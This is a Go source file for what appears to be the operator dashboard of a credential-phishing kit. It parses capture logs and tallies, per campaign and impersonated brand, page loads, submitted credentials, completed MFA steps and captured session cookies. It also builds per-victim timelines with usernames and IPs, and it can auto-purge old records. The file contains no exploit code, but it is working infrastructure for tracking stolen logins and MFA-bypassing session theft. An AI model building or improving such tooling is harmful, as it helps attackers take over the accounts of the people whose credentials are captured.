package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"
)

// CaptureEvent is one line from data/captures.jsonl
type CaptureEvent struct {
	Timestamp  string `json:"timestamp"`
	CampaignID string `json:"campaign_id"`
	Brand      string `json:"brand"`
	Username   string `json:"username"`
	IP         string `json:"ip"`
	UserAgent  string `json:"user_agent"`
	Status     string `json:"status"`
	Source     string `json:"source"`
	EventType  string `json:"event_type"`
}

// VictimTimeline shows each victim's journey through the funnel.
type VictimTimeline struct {
	Username    string `json:"username"`
	CampaignID  string `json:"campaign_id"`
	Brand       string `json:"brand"`
	IP          string `json:"ip"`
	FirstSeen   string `json:"first_seen"`
	LastSeen    string `json:"last_seen"`
	HasPageLoad bool   `json:"has_page_load"`
	HasCreds    bool   `json:"has_creds"`
	HasMFA      bool   `json:"has_mfa"`
	Status      string `json:"status"` // "complete", "partial", "landed"
}

// TimeBucket holds event counts grouped by time window.
type TimeBucket struct {
	Window    string `json:"window"`     // "14:00", "15:00", etc
	PageLoads int    `json:"page_loads"`
	CredSubs  int    `json:"cred_submits"`
	MfaComps  int    `json:"mfa_completes"`
	Total     int    `json:"total"`
	MaxTotal  int    `json:"max_total"` // highest total across all buckets (for bar scaling)
}

// MaxAgeHours is set from env MAX_AGE_HOURS before cache use.
// When non-empty, parseJSONL filters out events older than this many hours.
var MaxAgeHours string

// CampaignStats holds aggregated stats for one campaign.
type CampaignStats struct {
	CampaignID string
	Brand      string
	Total      int
	Successes  int
	Failures   int
	Rate       float64
	LastSeen   string
}

// CampaignFunnel holds funnel-stage counts per campaign.
type CampaignFunnel struct {
	CampaignID    string   `json:"campaign_id"`
	Brand         string   `json:"brand"`
	PageLoads     int      `json:"page_loads"`
	CredSubmits   int      `json:"cred_submits"`
	MfaCompletes  int      `json:"mfa_completes"`
	CookieCaptures int     `json:"cookie_captures"`
	SuccessRate   float64  `json:"success_rate"`
	LastSeen      string   `json:"last_seen"`
	Victims       []string `json:"victims"`
}

// IPStats holds per-IP summary.
type IPStats struct {
	IP    string
	Count int
	Last  string
}

// DashboardData holds all data for the template.
type DashboardData struct {
	Total           int
	SuccessRate     float64
	UniqueIPs       int
	ActiveCampaigns int
	Campaigns       []CampaignStats
	Funnels         []CampaignFunnel
	TopIPs          []IPStats
	Recent          []CaptureEvent
	Timeline        []VictimTimeline `json:"timeline"`
	Buckets         []TimeBucket     `json:"buckets"`
	GeneratedAt     string
}

// parseJSONL reads the JSONL file and returns all valid events.
// Malformed lines are logged and skipped.
func parseJSONL(path string) ([]CaptureEvent, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	// Auto-purge: filter events older than MaxAgeHours (set from env).
	var filterByAge bool
	var cutoff time.Time
	if MaxAgeHours != "" {
		if h, err := strconv.Atoi(MaxAgeHours); err == nil && h > 0 {
			cutoff = time.Now().UTC().Add(-time.Duration(h) * time.Hour)
			filterByAge = true
		}
	}

	var events []CaptureEvent
	scanner := bufio.NewScanner(f)
	scanner.Buffer(make([]byte, 0, 64*1024), 1024*1024)
	for scanner.Scan() {
		line := scanner.Bytes()
		if len(line) == 0 {
			continue
		}
		var ev CaptureEvent
		if err := json.Unmarshal(line, &ev); err != nil {
			log.Printf("skipping malformed JSONL line: %v", err)
			continue
		}
		// Filter out events older than cutoff.
		if filterByAge {
			if t, err := parseTimestamp(ev.Timestamp); err == nil && t.Before(cutoff) {
				continue
			}
		}
		events = append(events, ev)
	}
	return events, scanner.Err()
}

// aggregate transforms raw events into ranked dashboard data.
func aggregate(events []CaptureEvent) *DashboardData {
	dd := &DashboardData{
		Total:       len(events),
		GeneratedAt: time.Now().UTC().Format(time.RFC3339),
	}

	type campKey struct {
		ID    string
		Brand string
	}
	campMap := map[campKey]*CampaignStats{}
	funnelMap := map[campKey]*CampaignFunnel{}
	ipMap := map[string]*IPStats{}
	successes := 0

	for _, ev := range events {
		if ev.Status == "success" {
			successes++
		}
		ck := campKey{ev.CampaignID, ev.Brand}
		if campMap[ck] == nil {
			campMap[ck] = &CampaignStats{CampaignID: ev.CampaignID, Brand: ev.Brand}
		}
		cs := campMap[ck]
		cs.Total++
		if ev.Status == "success" {
			cs.Successes++
		} else {
			cs.Failures++
		}
		if ev.Timestamp > cs.LastSeen {
			cs.LastSeen = ev.Timestamp
		}

		// Funnel tracking by event_type
		if funnelMap[ck] == nil {
			funnelMap[ck] = &CampaignFunnel{CampaignID: ev.CampaignID, Brand: ev.Brand}
		}
		fn := funnelMap[ck]
		switch ev.EventType {
		case "page_load":
			fn.PageLoads++
		case "credential_submit":
			fn.CredSubmits++
		case "mfa_complete":
			fn.MfaCompletes++
		case "cookie_capture":
			fn.CookieCaptures++
		}
		if ev.Timestamp > fn.LastSeen {
			fn.LastSeen = ev.Timestamp
		}
		// Track unique victims
		if ev.Username != "" {
			found := false
			for _, v := range fn.Victims {
				if v == ev.Username {
					found = true
					break
				}
			}
			if !found {
				fn.Victims = append(fn.Victims, ev.Username)
			}
		}

		if ipMap[ev.IP] == nil {
			ipMap[ev.IP] = &IPStats{IP: ev.IP}
		}
		ipMap[ev.IP].Count++
		if ev.Timestamp > ipMap[ev.IP].Last {
			ipMap[ev.IP].Last = ev.Timestamp
		}
	}

	if dd.Total > 0 {
		dd.SuccessRate = float64(successes) / float64(dd.Total) * 100
	}
	dd.UniqueIPs = len(ipMap)
	dd.ActiveCampaigns = len(campMap)

	for _, cs := range campMap {
		if cs.Total > 0 {
			cs.Rate = float64(cs.Successes) / float64(cs.Total) * 100
		}
		dd.Campaigns = append(dd.Campaigns, *cs)
	}
	sort.Slice(dd.Campaigns, func(i, j int) bool {
		return dd.Campaigns[i].LastSeen > dd.Campaigns[j].LastSeen
	})

	// Build funnel list with success rates
	for _, fn := range funnelMap {
		total := fn.PageLoads + fn.CredSubmits + fn.MfaCompletes + fn.CookieCaptures
		if total > 0 {
			if fn.PageLoads > 0 {
				fn.SuccessRate = float64(fn.MfaCompletes) / float64(fn.PageLoads) * 100
			}
		}
		dd.Funnels = append(dd.Funnels, *fn)
	}
	sort.Slice(dd.Funnels, func(i, j int) bool {
		return dd.Funnels[i].LastSeen > dd.Funnels[j].LastSeen
	})

	for _, is := range ipMap {
		dd.TopIPs = append(dd.TopIPs, *is)
	}
	sort.Slice(dd.TopIPs, func(i, j int) bool {
		return dd.TopIPs[i].Count > dd.TopIPs[j].Count
	})
	if len(dd.TopIPs) > 20 {
		dd.TopIPs = dd.TopIPs[:20]
	}

	start := len(events) - 50
	if start < 0 {
		start = 0
	}
	recent := make([]CaptureEvent, len(events)-start)
	copy(recent, events[start:])
	for i, j := 0, len(recent)-1; i < j; i, j = i+1, j-1 {
		recent[i], recent[j] = recent[j], recent[i]
	}
	dd.Recent = recent

	dd.Timeline = buildTimeline(events)
	dd.Buckets = buildBuckets(events, 60)

	return dd
}

// parseTimestamp attempts to parse a timestamp string using several common formats.
func parseTimestamp(s string) (time.Time, error) {
	formats := []string{
		time.RFC3339,
		time.RFC3339Nano,
		"2006-01-02T15:04:05",
		"2006-01-02 15:04:05",
	}
	for _, f := range formats {
		if t, err := time.Parse(f, s); err == nil {
			return t, nil
		}
	}
	return time.Time{}, fmt.Errorf("cannot parse timestamp: %s", s)
}

// buildTimeline groups events by username and returns one VictimTimeline per victim.
// Events with empty username are skipped.  Results are sorted by LastSeen descending.
func buildTimeline(events []CaptureEvent) []VictimTimeline {
	type victimData struct {
		username    string
		campaignID  string
		brand       string
		ip          string
		firstSeen   string
		lastSeen    string
		hasPageLoad bool
		hasCreds    bool
		hasMFA      bool
	}

	victimMap := make(map[string]*victimData)

	for _, ev := range events {
		if ev.Username == "" {
			continue
		}
		key := strings.ToLower(ev.Username)
		v, ok := victimMap[key]
		if !ok {
			v = &victimData{
				username:   ev.Username,
				campaignID: ev.CampaignID,
				brand:      ev.Brand,
				ip:         ev.IP,
				firstSeen:  ev.Timestamp,
				lastSeen:   ev.Timestamp,
			}
			victimMap[key] = v
		}
		switch ev.EventType {
		case "page_load":
			v.hasPageLoad = true
		case "credential_submit":
			v.hasCreds = true
		case "mfa_complete":
			v.hasMFA = true
		}
		if ev.Timestamp < v.firstSeen {
			v.firstSeen = ev.Timestamp
		}
		if ev.Timestamp > v.lastSeen {
			v.lastSeen = ev.Timestamp
		}
	}

	var timeline []VictimTimeline
	for _, v := range victimMap {
		status := "landed"
		if v.hasMFA {
			status = "complete"
		} else if v.hasCreds {
			status = "partial"
		}
		timeline = append(timeline, VictimTimeline{
			Username:    v.username,
			CampaignID:  v.campaignID,
			Brand:       v.brand,
			IP:          v.ip,
			FirstSeen:   v.firstSeen,
			LastSeen:    v.lastSeen,
			HasPageLoad: v.hasPageLoad,
			HasCreds:    v.hasCreds,
			HasMFA:      v.hasMFA,
			Status:      status,
		})
	}

	sort.Slice(timeline, func(i, j int) bool {
		return timeline[i].LastSeen > timeline[j].LastSeen
	})

	return timeline
}

// buildBuckets groups events by time window and returns counts per bucket.
// windowMins defaults to 60 (1 hour) when <= 0.
// Buckets are sorted by window ascending and include MaxTotal for bar chart scaling.
func buildBuckets(events []CaptureEvent, windowMins int) []TimeBucket {
	if windowMins <= 0 {
		windowMins = 60
	}
	windowDur := time.Duration(windowMins) * time.Minute

	type bucketKey string
	bucketMap := make(map[bucketKey]*TimeBucket)

	for _, ev := range events {
		t, err := parseTimestamp(ev.Timestamp)
		if err != nil {
			continue
		}
		bucketTime := t.Truncate(windowDur)
		key := bucketKey(bucketTime.Format("15:04"))

		b, ok := bucketMap[key]
		if !ok {
			b = &TimeBucket{Window: string(key)}
			bucketMap[key] = b
		}
		b.Total++
		switch ev.EventType {
		case "page_load":
			b.PageLoads++
		case "credential_submit":
			b.CredSubs++
		case "mfa_complete":
			b.MfaComps++
		}
	}

	var buckets []TimeBucket
	maxTotal := 0
	for _, b := range bucketMap {
		if b.Total > maxTotal {
			maxTotal = b.Total
		}
		buckets = append(buckets, *b)
	}
	for i := range buckets {
		buckets[i].MaxTotal = maxTotal
	}

	sort.Slice(buckets, func(i, j int) bool {
		return buckets[i].Window < buckets[j].Window
	})

	return buckets
}

// Cache holds in-memory dashboard data, re-reading on mtime change.
type Cache struct {
	mu    sync.RWMutex
	path  string
	mtime time.Time
	data  *DashboardData
	err   error
}

func NewCache(path string) *Cache {
	return &Cache{path: path}
}

func (c *Cache) Get() (*DashboardData, error) {
	info, err := os.Stat(c.path)
	if err != nil {
		c.mu.RLock()
		defer c.mu.RUnlock()
		if c.data == nil {
			return nil, err
		}
		return c.data, nil
	}

	c.mu.RLock()
	stale := !info.ModTime().Equal(c.mtime)
	c.mu.RUnlock()

	if stale {
		c.mu.Lock()
		if !info.ModTime().Equal(c.mtime) {
			log.Printf("re-reading %s (mtime changed)", c.path)
			events, err := parseJSONL(c.path)
			if err != nil {
				c.err = err
				c.mu.Unlock()
				return nil, err
			}
			c.data = aggregate(events)
			c.mtime = info.ModTime()
			c.err = nil
		}
		c.mu.Unlock()
	}

	c.mu.RLock()
	defer c.mu.RUnlock()
	return c.data, c.err
}
